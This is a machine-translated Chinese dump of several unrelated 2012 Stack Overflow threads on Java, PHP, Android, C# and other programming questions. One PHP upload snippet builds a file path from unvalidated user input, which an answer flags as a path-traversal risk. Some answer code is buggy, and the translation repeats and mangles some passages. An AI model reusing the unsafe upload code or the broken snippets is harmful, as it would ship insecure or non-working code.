        public void run() {
            int i = 0;
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    i++;
                    if (i == 1) {
                        scan.interrupt();
                    }
                } 
                catch (Exception e) {
                    Thread.currentThread().interrupt();
                }
                catch (Throwable t) {
                    System.out.println("Thrown test: "+t.getMessage());
                }
            }
        }
    });

    scan.start();
}

    public void stoprun() {
        if(scan != null){
            scan.interrupt();
        }
    }
} 
```

在我的界面中，我有一个按钮来启动线程：

```
<p:commandLink action="submit" value="" onclick="testdialog.show()" oncomplete="testdialog.hide()" actionListener="#{results.testrun}" update="messages, runmsg, @form results" /> 
```

还有一个试图打断它：

```
<p:commandButton action="submit" value="Cancel Test" onclick="testdialog.hide()" actionListener="#{results.stoprun}" update="messages, runmsg" /> 
```

问题是“停止运行”功能将“扫描”视为空，我不知道为什么。在 testrun() 中添加 scan.interrupt() 可以正常工作。我考虑过使用 Thread.currentThread().interrupt() 但是当我调用 stoprun 时，当前线程 ID/名称似乎不同。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:34:52.597

那是因为 bean 是`@RequestScoped`- 每个 HTTP 请求（= 按钮单击）都会获得一个新实例。

你`@Scope("session")`至少需要做到。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:36:30.187

`stopRun`在第一次运行之前被调用到`testRun`，因此该成员是`null`。这是因为每个方法调用都发生在一个新实例上。

# exception-handling - 创建 azure 限制异常

> ID：12068231
> 
> 赞同：0
> 
> 时间：2012-08-22T07:28:53.167
> 
> 标签：exception-handling

我们如何在 sql azure 中以经济高效的方式轻松创建节流异常？这是为了在 windows azure 中测试 TransientFaultHandling 库。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T13:06:08.403

找到方法了！创建一个从 ITransientErrorDetectionStrategy 派生的模拟类并返回 true。使用这个类 `var retryPolicy = new RetryPolicy<MockClass>(retryStrategy);` 就是这样！无需创建真正的限制异常。[更多..](http://azuretable.blogspot.nl/2012/08/unit-testing-transient-errors-in-azure.html)

# .net - 选择计数(*)、最大值(Field1)、最小值(Field1)

> ID：12068233
> 
> 赞同：3
> 
> 时间：2012-08-22T07:28:56.817
> 
> 标签：.net, sql-server, vb.net, linq

> **可能重复：**
> [`SELECT MIN(ZoneMin), MAX(ZoneMin) FROM Plant`作为 LINQ to SQL](https://stackoverflow.com/questions/4672239/select-minzonemin-maxzonemin-from-plant-as-linq-to-sql)

我很难尝试将以下 SQL 查询转换为 Linq。

```
SELECT 
  COUNT(*) AS Qty, 
  MAX(Field1) AS MinValue, 
  MIN(Field1) AS MaxValue,
  SUM(Field2) AS TotalValue
FROM 
  Table1
WHERE
  FieldTypeID = 1 
```

我确实意识到我可以执行 4 个 linq 表达式来获取每个部分，但如果可能的话，我宁愿不访问服务器 4 次。

# iphone - 不滚动的 UITableViewHeader

> ID：12068243
> 
> 赞同：1
> 
> 时间：2012-08-22T07:29:21.620
> 
> 标签：iphone, objective-c, ios, uitableview, uistoryboard

我有一个 TableViewController，它应该在表格视图的顶部有一个“浮动”标题，它不应该***随着***内容滚动。

有没有办法使用 UITableViewController 来实现这一点（我知道这可以通过在普通文本中嵌套 Tableview 来完成，`UIViewController`但我更愿意将 a`UITableViewController`作为主 ViewController，这样我就可以使用 Storyboard TableView-Goodies 的好处。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:46:20.113

用它的一个或一个子类制作一个笔尖，`UITableViewController`然后简单地重新排列表格视图，为标题视图腾出空间。布局稍有不同且视图更多的表视图控制器仍然是表视图控制器。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-22T12:27:11.617

它可能被认为是*hack*，但这似乎可以完成工作！（使用默认的主从项目模板测试）

首先将 MasterViewController 的类型更改为 a`UIViewController`并添加委托和数据源的协议引用。还`IBOutlet`为 a 添加一个`UITableView`。

```
@interface MasterViewController : UIViewController <UITableViewDataSource, UITableViewDelegate>

@property (weak, nonatomic) IBOutlet UITableView *tableView;

@end 
```

接下来，将其`IBOutlet`连接到`UITableView`Storyboard 编辑器中的 。

现在将以下代码添加到`viewDidLoad`：

```
UIView *mainView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 320, 480)];
UILabel *header = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, 320, 40)];
header.text = @"HEADER";
header.backgroundColor = [UIColor greenColor];
[mainView addSubview:header];
self.tableView.frame = CGRectMake(0, 40, 320, 440);
[mainView addSubview:self.tableView];
self.view = mainView; 
```

# joomla - Joomla 中的动态模块参数

> ID：12068244
> 
> 赞同：1
> 
> 时间：2012-08-22T07:29:26.410
> 
> 标签：joomla, joomla1.5, joomla2.5

我需要根据其他选定的参数设置动态模块参数。例如：主题：样式 1、样式 2、样式 3、样式 4、样式 5 等。

如果选择样式 1，我只想显示样式 1 的配置选项，因为它们是唯一适用的选项。样式 1 > 颜色，样式 1 > 宽度，样式 1 > 高度等。

我不想有太多可见字段（无论如何都不适用于模块）。有没有办法可以添加 javascript 来隐藏其他字段，或者是否有其他解决方案来解决这个问题。

也需要 Joomla 1.5 和 2.5 的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T09:23:04.057

在 Joomla 1.5 中这是不可能的（据我所知）。我总是尽量按照逻辑对字段进行排序并使用高级选项卡。

至于2.5，这里有说明：[http ://www.spiralscripts.co.uk/Joomla-Tips/creating-custom-parameters-in-joomla-16.html](http://www.spiralscripts.co.uk/Joomla-Tips/creating-custom-parameters-in-joomla-16.html)

# ruby-on-rails - Rails 命名约定问题

> ID：12068248
> 
> 赞同：-1
> 
> 时间：2012-08-22T07:30:03.400
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms, naming-conventions

我的问题与 Rails 命名约定难题有关。我的应用程序具有注册、登录、退出功能。

对于注册页面，我使用了`form_for(@user)`helper。

对于登录页面，我使用了`form_for(:session, url: sessions_path)`. 但是在我的 routes.rb 文件中，我`resources :sessions`在登录页面中包含了 form_for 助手参数中提到的单数而不是单数。

如果有人可以：

1.) 解决这个特定的 form_for 问题

```
2.) More importantly point me in the direction where I can learn/read about Rails naming conventions, I would be highly indebted. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:39:59.930

1.  我敢打赌@user 已经被初始化了`User.new`——这是一个新用户。当您注册时，您想创建一个新用户，以便您可以将 form_for(@user) 翻译为“新用户的表单”。请注意，在这种情况下，您提供 form_for 一个 ActiveRecord 用户实例，这就是它的使用方式。
2.  当您给 form_for 一个符号而不是 ActiveRecord 模型的实例时，它会使用该符号将输入嵌套在表单中。例如，如果您`<%= f.text :name %>`输入表单，它将生成`<input name="session[name]" type="text">`. 此外，当现有用户登录时，您不想创建新用户（如步骤 1 中），您只想为现有用户创建新会话，因此发布到 sessions_path 看起来非常直观。
3.  您可以在终端中键入命令`rake routes`并获取为您的应用程序设置的所有命名路由，这将使您很好地了解 rails 如何将资源命令转换为命名路由。

欲了解更多信息，请阅读以下内容：

[Rails 路由指南](http://guides.rubyonrails.org/routing.html)

[form_for ApiDock 文档](http://apidock.com/rails/ActionView/Helpers/FormHelper/form_for)

# jquery - 通过 SSL 的 jQuery Ajax 请求

> ID：12068249
> 
> 赞同：2
> 
> 时间：2012-08-22T07:30:12.073
> 
> 标签：jquery, ajax, ssl, https

所以我使用下面的代码来发送一个ajax请求

```
 $.ajax({
                        type: 'POST',
                        url: base_url + "/notifications/send_notification",
                        dataType: 'json',
                        data: {
                            action: 'action_complete',
                            entity_id: 31
                        }
                    }); 
```

这段代码在我的本地机器上运行良好，但是当我将它上传到我们的服务器（现在有 SSL 设置），并尝试通过 https 而不是 http 进行时，它会出现“500 Internal Server Error”。

Ps“base_url”变量确实包含“https”url。

编辑：这是 Chrome 中 Network > Header 选项卡的屏幕截图： ![在此处输入图像描述](../Images/4008abc1e33f1792e02f870ba13b401f.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:36:34.427

如果`base_url`是您所在的网站，我的意思是如果您在 https://www.example.com 输入您的网站[，](https://www.example.com)并且`base_url`位于[https://www.example.com/notifications/send_notification](https://www.example.com/notifications/send_notification)然后尝试`base_url`从`url`参数中省略.

如果`base_url`是另一个站点，那么它可能是一些跨站点脚本问题。

如果不是上述情况，则可能是服务器问题。你确定 SSL 证书是好的吗？如果它是自签名的，那么您需要先在浏览器中“批准”它。

最后，您可以检查确切的发送/接收数据，即 Chrome，只需 F12 并检查`Network`（必须在发出请求之前打开）。

此外，您可以直接使用 Fiddler 请求该 url（如果是 POST，如果是 GET，则只需使用浏览器进入它）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:32:57.983

从浏览器执行网络监控以读取 500 Internal Server Error 响应的正文。如果您要发回 JSON，请确保您申请`AllowGet: true`.

您可以像这样发布响应正文的屏幕截图： ![在此处输入图像描述](../Images/5de303cf61bec68d0215d995dd26c883.png)

# codeigniter - CodeIgniter 表单验证多语言标签

> ID：12068250
> 
> 赞同：0
> 
> 时间：2012-08-22T07:30:17.453
> 
> 标签：codeigniter, validation, multilingual

我目前正在开发一个可以用 3 种不同语言查看的网站。我已将所有文本放入语言文件中，几乎所有内容都按预期工作。诸如分页配置之类的东西我已经放入配置文件并放入`application/config`，如下所示：

```
<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

$config['num_links']      = 2;
$config['full_tag_open']  = '<p class="pagination">';
$config['full_tag_close'] = '</p>';
$config['first_link']     = '&laquo;&nbsp;' . lang('first');
$config['last_link']      = lang('last') . '&nbsp;&raquo;'; 
```

它工作得很好，但我已经为我的表单验证配置文件尝试了同样的方法，如下所示：

```
<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

$config = array(

    'login' => array(
        array(
            'field' => 'login_email',
            'label' => lang('emailaddress'),
            'rules' => 'trim|required|valid_email|min_length[6]'
        ),
        array(
            'field' => 'login_password',
            'label' => lang('password'),
            'rules' => 'trim|required'
        ),
    ), 
```

但这似乎不起作用。看起来这个配置文件是在语言文件/库之前加载的。老实说，目前我真的不知道如何解决这个问题，除了再次从配置文件中取出所有内容并将其放入控制器中，但我宁愿不这样做。

任何想法如何解决这一问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-28T16:08:24.593

如果您在定义表单验证规则时检查字段转换是如何完成的（请参见下面的示例并考虑**第二个参数**）：

```
$this->form_validation->set_rules('first_name', 'lang:first_name', 'required'); 
```

您可以在实际代码中看到您在哪里做错了。代替：

```
array(
    'field' => 'login_password',
    'label' => lang('password'),
    'rules' => 'trim|required'
), 
```

要走的路是：

```
 array(
    'field' => 'login_password',
    'label' => 'lang:password',
    'rules' => 'trim|required'
), 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-05-21T19:05:58.927

@Krishna Raj K 我像你一样使用 trans 函数。我已经修好了。我使用wiredesignz hmvc的另一件事。MY_Form_validation.php

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed'); 

    /** application/libraries/MY_Form_validation **/ 
    class MY_Form_validation extends CI_Form_validation 
    {
        public $CI;

        protected function _translate_fieldname($fieldname)
        {
            // Do we need to translate the field name? We look for the prefix 'trans:' to determine this
            if (sscanf($fieldname, 'trans:%s', $line) === 1 )
            {
                return trans($line);
            }

        return $fieldname;
    }
} 
```

模型中的规则

```
'parent_id' => array(
                        'field'=>'parent_id',
                        'label'=>'trans:main.taxonomy.column.parent_id.name',
                        'rules'=>'is_natural_no_zero',

                    ), 
```

在控制器中，您必须按照此顺序加载

```
//helper
$this->load->helper(array('array','form','anhtocon','trans'));
//library
$this->load->library(array('Nested_set','form_validation'));

$this->form_validation->CI =& $this;
//model
$this->load->model('taxonomy_model'); 
```

# lotus-notes - 将 Document ( form ) - EditMode 设置为 false

> ID：12068256
> 
> 赞同：0
> 
> 时间：2012-08-22T07:30:40.683
> 
> 标签：lotus-notes

我想在 EditMode = false; 因此，当打开表单时，我希望在按下放置文档的按钮之前不能修改任何字段等。在 EditMode = true。

我的代码是这样的：

Sub Initialize Dim ws As New NotesUIWorkspace Dim uidoc As NotesUIDocument Dim doc As NotesDocument Set uidoc = ws.CurrentDocument 'Set doc = uidoc.Document

uidoc.EditMode = False

结束子

我选择在 Form 的 Initialize 方法中编写代码...

但它不起作用，它给了我这样的消息：“文档命令不可用”。请帮助，我将不胜感激，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:03:17.717

作为一般经验法则，Initialize 事件不应在表单中使用。其原因之一是在 Initialize 运行时表单未必已完成所有内容的加载。

此代码应放置在 QueryOpen 事件中。

另一个最佳实践是不使用 NotesWorkspace.CurrentDocument 来获取当前表单的句柄，而是使用传递给 QueryOpen 事件的 Source 参数。NotesWorkspace.CurrentDocument 应该只用于代理和其他表单尚未在上下文中的地方。在当前文档已经在上下文中时调用 NotesWorkspace.CurrentDocument 可能会导致 Notes 出现奇怪的行为。

这是一些应该工作的代码：

```
Sub Queryopen(Source As Notesuidocument, Mode As Integer, Isnewdoc As Variant, Continue As Variant)
    If (Not Source Is Nothing) Then Source.EditMode = False
End Sub 
```

# java - 获取一个不太具体的数字 - 从另一个数字

> ID：12068257
> 
> 赞同：2
> 
> 时间：2012-08-22T07:30:43.667
> 
> 标签：java, math, numbers, bit-manipulation

对，对不起，我想不出正确的词来谷歌这个。所以我得问问。

我有一个`long`( `System.currentTimeMillis()`)

让我们说

3453646345345345

我想删除最后六个（或其他数量的）数字，我想我可以通过某种位移来做到这一点？

所以我最终会得到

3453646345

*编辑*

我想得到`System.currentTimeMillis()`一个时间框，所以如果我问时间然后再问 29 秒后它会返回相同的数字，但如果我问 31 秒后它会返回一个不同的数字。30 秒时间框可配置。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T07:33:00.840

您只需将其除以 1M`long shorter = System.currentTimeMillis() / 1000000L;`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-22T07:53:36.417

要以@Yob 的答案为基础，您可以通过创建如下方法来配置要删除的位数：

```
public long removeDigits(long number, int digitsToRemove) {
    return number / (long)Math.pow(10, digitsToRemove);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T07:39:55.313

根据您想要做的事情（我假设以 10 为基数），您可以这样做：

```
int64_t radix = 1000000; // or some other power of 10

x -= x%radix; // last 6 decimal digits are now 0
              // e.g: from 3453646345345345 to 3453646345000000 
```

或者这个（如上一个答案）：

```
x /= radix; // last 6 decimal digits are gone, the result rounded down
            // e.g: from 3453646345345345 to 3453646345 
```

### 对编辑的回应

出于您的目的，您可以`radix`将模数示例更改为 30000：

```
int64_t timeInterval = 30000;
displayTime = actualTime - (actualTime % timeInterval); 
```

以毫秒为单位的地点`displayTime`和`actualTime`地点。`displayTime`在这种情况下，将具有 30 秒的（向下舍入）粒度，同时保留毫秒单位。

要获得向上的粒度，您可以执行以下操作：

```
int64_t timeInterval = 30000;
int64_t modulus = actualTime % timeInterval;
displayTime = actualTime - modulus + (modulus?timeInterval:0); 
```

不过，根据您的要求，您似乎只想每隔几个刻度更新一次显示值。以下也将起作用：

```
if((actualTime - displayTime) >= timeInterval){
    displayTime = actualTime - (actualTime % timeInterval);
} 
```

请原谅 C 整数类型，我只是希望对我使用的整数的宽度保持明确：P。

# jquery - 删除小图像

> ID：12068261
> 
> 赞同：0
> 
> 时间：2012-08-22T07:31:09.373
> 
> 标签：jquery

我有以下脚本来删除太小但无法正常工作的图像，第一次加载页面时，每个图像都被替换为`no-image.png`，刷新页面后它可以正常工作，我在这里缺少什么？

```
$(document).ready(function () {
    $('.story-img').error(function () {
        $(this).attr("src", "/Images/no-image.png");
        $(this).css('border', 'none');
    });

    $(".story-img").each(function () {

        var theImage = new Image();
        theImage.src = $(this).attr("src") || $(this).src;

        var imageWidth = theImage.width;
        var imageHeight = theImage.height;

        if (imageWidth < 32 || imageHeight < 32 || $(this).height() < 32 || $(this).width < 32) {
            $(this).attr("src", "/Images/no-image.png");
            $(this).css('border', 'none');
        }

    });
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:34:57.267

您可能在加载图像之前检查它们的 with（这使得它们的宽度和高度等于 0）。您可以使用`$(image).load()`：

```
$(".story-img").load(function () {

    //...

}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:41:28.410

这可能是因为在页面 html 完成加载之前图像数据尚未完成加载。您可以使用 javascript LOAD 事件，该事件会等待所有图像完成加载。采用

```
$(window).load(function(){} 
```

# php - 上传后需要重命名图片

> ID：12068265
> 
> 赞同：0
> 
> 时间：2012-08-22T07:31:20.700
> 
> 标签：php

我这里有这个代码，它输出给我一个图像。我需要改变它，因为目前它给了我类似的东西：test.jpg，我需要的是它给我 test_s.jpg

我猜使用重命名功能！

```
$tempFile = $_FILES['Filedata']['tmp_name'];
$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';
$targetPath = str_replace('//','/',$targetPath);
$targetFile = $targetPath . $_FILES['Filedata']['name'];
tamano_nuevo_foto($stempFile, 420, $stargetFile); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:34:55.927

你可以这样做：

```
$extension = array_pop( explode(".", $_FILES['Filedata']['name']) ); //get extension
$targetFile = $targetPath . "some_new_name".$extension;
tamano_nuevo_foto($tempFile, 420, $targetFile); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:36:38.770

第一：您似乎有一条可由用户操纵的路径。您直接在路径中使用 $_REQUEST['folder'] 是不好的。用户可以把任何东西放在那里，甚至像 ../../../ 这样的东西在你的文件系统中移动！

要更改名称，只需：

$targetFile = $targetPath 。“我的文件名.png”；

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:40:01.707

或者您可以使用此功能：

```
function add_s($file){
    $fName = substr($file, 0,strpos($file, "."));
    $fExtension = substr($file, strpos($file, "."));
    $newFName = $fName."_s".$fExtension;
    return $newFName;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:47:35.870

你应该使用[`pathinfo`](http://php.net/manual/fr/function.pathinfo.php)和[`move_uploaded_file`](http://php.net/manual/en/function.move-uploaded-file.php)

```
$tempFile = $_FILES['Filedata']['tmp_name'];
$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/'; // should make this more secure, like a fixed path or in a whitelist
$targetPath = str_replace('//','/',$targetPath);
$ext = pathinfo($_FILES['Filedata']['name'], PATHINFO_EXTENSION);
$basename = pathinfo($_FILES['Filedata']['name'], PATHINFO_BASENAME);
$targetFile = $targetPath . $basename . "_s" . $ext;
move_uploaded_file ( $tempFile , string $targetFile)
//tamano_nuevo_foto($stempFile, 420, $stargetFile); // move and resize ?? 
```

# android - 如何在 gridview 中显示 2 个重叠视图？

> ID：12068268
> 
> 赞同：0
> 
> 时间：2012-08-22T07:31:29.213
> 
> 标签：android, gridview, adapter, overlapping, custom-view

我正在使用 Gridview 将图像显示到屏幕上，目前正在使用 ImageAdapter 将下载的图像加载到 Gridview 中。如果被点击，我将在所选图像上绘制另一个图像以表示选择，问题是我必须通过 RelaytiveLayout 将它们添加为子级，因此当我滚动图像时，它们会停留在它们创建的位置并且不跟随与卷轴。所以我然后尝试创建一个自定义视图，其中 2 个图像视图重叠，设置一个隐藏，另一个由适配器填充。选择后，计划是取消隐藏重叠图像。从适配器加载时，我的自定义视图（实际上必须扩展 ViewGroup 以包含两个图像视图，因为视图无法添加子视图）将加载一个可选择的框架，但完全透明，没有图像显示。我知道它是可选择的，因为当我触摸屏幕时，我设置的尺寸中会出现一个蓝色框。为了显示自定义视图，我在 publc getView() 函数中加载它。我会以错误的方式解决这个问题吗？我已经尝试了很多，看看是否有其他人做过类似的事情，但我能找到的只是在 RelativeLayout 上绘制重叠图像或将图像加载到 GridView 中的教程，但不是两者兼而有之。抱歉，我是 Android 新手。但我能找到的只是在 RelativeLayout 上绘制重叠图像或将图像加载到 GridView 中的教程，但不是两者兼而有之。抱歉，我是 Android 新手。但我能找到的只是在 RelativeLayout 上绘制重叠图像或将图像加载到 GridView 中的教程，但不是两者兼而有之。抱歉，我是 Android 新手。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:12:35.070

ListView 在触摸模式下不保留焦点（或选择）的视觉指示。只有当您使用硬件键盘或控件来导航您的 UI 时，您才会看到这一点。

有关更多详细信息，请参阅 Google[触控](http://android-developers.blogspot.in/2008/12/touch-mode.html)模式 Android 博客文章。

因此，如果您只使用触摸模式，您将永远不会在 ListViews 上看到焦点或选择。

> 您所做的只需稍作修改即可正常工作。

*   将 ImageView(child) 放在容器内（父级，如 RelativeLayout 等）。
*   为父级设置一些填充，以便它的背景可见。
*   单击时更改被单击项目的父背景（在 GridView 的 OnClickListener 的 onClick() 方法中）。
*   在适配器上调用 notifyDataSetChanged()（重绘当前可见的项目）

这是一个示例代码：

```
 grid.setOnItemClickListener(new OnItemClickListener() {
            @Override
            public void onItemClick (AdapterView<?> parent,
                    View v, int position, long Id)
            {
                    highlighted = position;    //highlighted is a global variable
                    //container is the root view of the list row layout
                    LinearLayout container = (LinearLayout)v.findViewById(R.id.container);
                    container.setBackgroundResource(R.drawable.highlighted_backg);
                    mGridAdapter.notifyDataSetChanged();

            }
   }); 
```

getView() 方法的代码：

```
public View getView (int position, View convertView, ViewGroup parent)
{
    ViewHolder holder;

    if(convertView == null) {
        convertView = inflater.inflate(R.layout.row_item, null);
        holder = new ViewHolder();
        holder.itemName1 = (TextView)convertView.findViewById(R.id.text1);
        ...
        holder.container = (LineaLayout)convertView.findViewById(R.id.container);
        convertView.setTag(holder);
    } else {
        holder = (ViewHolder) convertView.getTag();
    }

    if(MainActivity.highlighted == position) {
        holder.container.setBackgroundResource(R.drawable.highlighted_backg);
    }else {
        holder.foodItemCol1.setBackgroundResource(R.drawable.normal_back);
    }

    return convertView;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-25T10:54:28.210

```
ImageView iv = (ImageView)v.findViewById(R.id.grid_item_image);
iv.setBackgroundResource(imageIDs[4]);
iv.setImageResource(imageIDs[2]); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:48:11.937

如果我没记错的话，您需要的是`gridView`点击时视图的选中状态。我认为没有必要在现有的基础上绘制另一个图像。您可以在使用自定义适配器时使用 viewHolder 模式更改现有视图背景本身。看看下面的链接。你可能会知道该怎么做。

[在 Android 的自定义 Listview 中动态隐藏视图](https://stackoverflow.com/questions/11949813/dynamically-hiding-views-in-custom-listview-in-android/11950092#11950092)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-31T02:55:43.453

例如，您可以为选定的图像视图设置颜色过滤器`imageView.setColorFilter(Color.parse("#77000000"));`（将其添加`onClick`到 ImageView 的方法中`onClickListener`），这将在选定的图像上添加一个半透明的灰色层`ImageView`以识别它被选中。

# c# - 是否可以从采用字符串的工厂方法实例化泛型类型？

> ID：12068274
> 
> 赞同：0
> 
> 时间：2012-08-22T07:32:10.607
> 
> 标签：c#, generics, factory, instantiation

我正在编写一个由 Importer 和 Processor 组成的应用程序。Importer 将采用一个类型并实例化`List<>`该类型的 a。处理器需要获取返回的列表。

例如，我想调用`Importer<Organisation>.GetObjects()`并让它返回一个`List<Organisation>`. 然后将列表传递给我的 OrganisationProcessor。

同样，我想调用`Importer<Address>.GetObjects()`并让它返回一个`List<Address>`. 然后将列表传递给我的地址处理器。

我想将`Importer<>`and *Processor 的创建放入工厂。我已经删除了所有代码并在下面生成了一个未受污染的样本。我的尝试没有成功，可能归结为我不完全理解的方差之类的话题。

```
class Program
{
    static void Main(string[] args)
    {
        //What I am currently doing
        Importer<Organisation> importer = new Importer<Organisation>();
        List<Organisation> list = importer.GetObjects();
        OrganisationProcessor processor = new OrganisationProcessor();
        processor.Process(list);

        //***What I want to do*** 
        string name = "Organisation";  //Passed in from external source
        var importer = Factory.GetImporter(name);  //returns Importer<Organisation>
        var processor = Factory.GetProcessor(name); //returns OrganisationProcessor
        processor.Process(importer.GetObjects()); //.Process takes List<Organisation>
    }
}

public class Importer<T>
{
    public List<T> GetObjects()
    {
        return new List<T>();
    }
}

public class OrganisationProcessor
{
    public void Process(List<Organisation> objects)
    {
        //Do something
    }
}

public class AddressProcessor
{
    public void Process(List<Address> objects)
    {
        //Do something
    }
}

public class Organisation { }

public class Address { } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:13:48.210

这应该可以解决问题，请注意您的最初意图没有改变，这甚至让我感到惊讶。另请注意，您必须添加命名空间才能在 Factory 中键入文字。使用 LINQ 查找类型更加灵活，但是在一行中输入带有命名空间的类型的路径更具可读性。我已经在没有命名空间的项目上执行了这个示例，它运行良好。

```
void Main()
{
    string name = "Organisation";  //Passed in from external source
    var importer = Factory.GetImporter(name);  //returns Importer<Organisation>
    var processor = Factory.GetProcessor(name); //returns OrganisationProcessor
    processor.Process(importer.GetObjects()); //.Process takes List<Organisation>
    Console.WriteLine (importer.GetObjects().GetType());
}

public static class Factory
{
    public static Importer GetImporter(string name)
    {           
            //add namespace to name here
        var desiredType = Type.GetType(name);

        return new Importer(desiredType);
    }
    public static Processor GetProcessor(string name)
    {
            //add namespace to name here
        var desiredType = Type.GetType(name+"Processor");

        return (Processor)Activator.CreateInstance(desiredType);
    }
}

public class Importer 
{
    Type _typeOfEntities;

    public Importer(Type typeOfEntities)
    {
        _typeOfEntities = typeOfEntities;
    }
    public IList GetObjects()
    {
        Type generic = typeof(List<>);

        Type constructed = generic.MakeGenericType(new Type[] {_typeOfEntities});

        return (IList)Activator.CreateInstance(constructed);
    }
}
public interface Processor
{
    void Process(IList objects);
}

public class OrganisationProcessor : Processor
{
    public void Process(IList objects)
    {
        var desiredTypedObject = objects as List<Organisation>;
        if(desiredTypedObject != null)
        ProcessImp(desiredTypedObject);
    }
    private void ProcessImp(List<Organisation> objects)
    {
        Console.WriteLine ("processing Organisation");
    }
}

public class AddressProcessor
{
    public void Process(List<Address> objects)
    {
        //Do something by analogy
    }
}

public class Organisation { }

public class Address { } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:09:02.747

`GetImporter`和的返回类型`GetProcessor`必须是`object`。无法让这些方法使用字符串中的运行时信息并返回其类型在编译时已知的对象。

您的样本必须如下所示：

```
string name = "Organisation";  //Passed in from external source
dynamic importer = Factory.GetImporter(name);  //returns Importer<Organisation>
dynamic processor = Factory.GetProcessor(name); //returns OrganisationProcessor
processor.Process(importer.GetObjects()); //.Process takes List<Organisation> 
```

其次，GetImporter 方法类似于

```
public static object GetImporter(string name)
{
    Type type = Type.GetType(name);
    Type importerType = typeof(Importer<>).MakeGenericType(type);
    return Activator.CreateInstance(importerType);
} 
```

最后，GetProcessor 将类似于

```
public static object GetProcessor(string name)
{
    Type type = Type.GetType(name + "Processor");
    return Activator.CreateInstance(type);
} 
```

请注意，传入的字符串名称必须是类型的全名，包括命名空间，并且仅限于与这些方法位于同一程序集中的类型（组织、地址）。如果要在其他程序集中使用类型，则必须使用[程序集限定名称](http://msdn.microsoft.com/en-us/library/system.type.assemblyqualifiedname.aspx)，但是用于生成处理器类型名称的字符串连接将不起作用。

我可能会在处理器类型上使用自定义属性，然后使用自定义属性而不是简单的字符串连接在程序集中查找所有类型，以生成上面的类型名称。如果某些类型被重命名，上述方案很脆弱，很容易破坏。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:10:54.470

是的，这是可能的。假设您的类在同一个程序集中，下面的代码没有优化太多，但可以解决问题：

```
public static class Factory
{
    public static object GetImporter(string name)
    {
        var assembly = Assembly.GetExecutingAssembly();

        var type = assembly.GetTypes().Single(t => t.Name.Equals(name));
        var importType = typeof (Importer<>).MakeGenericType(type);

        return Activator.CreateInstance(importType);

    }

    public static object GetProcessor(string name)
    {
        var assembly = Assembly.GetExecutingAssembly();
        var type = assembly.GetTypes()
               .Single(t => t.Name.Equals(string.Format("{0}Processor", name)));

        return Activator.CreateInstance(type);
    }
} 
```

因此，您使用上面的工厂，如下所示：

```
dynamic importer = Factory.GetImporter(name);
dynamic processor = Factory.GetProcessor(name);
processor.Process(importer.GetObjects()); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T07:41:27.903

在您的工厂中，Get... 方法可以使用[Activator.CreateInstance 方法](http://msdn.microsoft.com/en-us/library/hyk798fw%28VS.90%29.aspx)。此方法可以通过带有附加参数的 assamby-name 和 type-name 创建类的实例。

# java - Java EE Web 应用程序中的无效字符串或缓冲区长度异常

> ID：12068277
> 
> 赞同：1
> 
> 时间：2012-08-22T07:32:25.800
> 
> 标签：java, sql-server, exception, jdbc

我对 Java 编程很陌生，目前正在使用 MVC 架构开发我的第一个 Web 应用程序。但是我的应用程序遇到了很多问题，我不知道为什么会出现这些问题。例如，我的 JSP 页面中有以下代码：

```
 Connection connection = null;
                PreparedStatement statement = null;
                ResultSet rs = null;
                String QueryString="";
                String stuid="";
                try {
                        QueryString = "SELECT Student_ID, Student_F_Name, Student_L_Name, Student_NIC, Student_Address, Student_DOB, Student_Email, Student_Gender, Course_Name, Batch_Name, Student_username, Student_password FROM Student WHERE Student_ID = ?";
                        Class.forName("sun.jdbc.odbc.JdbcOdbcDriver").newInstance();
                        connection = DriverManager.getConnection("Jdbc:Odbc:UniversityDSN");
                        statement=connection.prepareStatement(QueryString);
                        stuid = session.getAttribute("studentid").toString();
                        statement.setString(1, stuid);
                        rs = statement.executeQuery(); 
```

有时此代码可以完美运行，但一段时间后，此代码停止工作，并提供如下错误：

> INFO: SQLException:[Microsoft][ODBC Driver Manager] 无效的字符串或缓冲区长度

但是如果我将上面的代码修改如下：

```
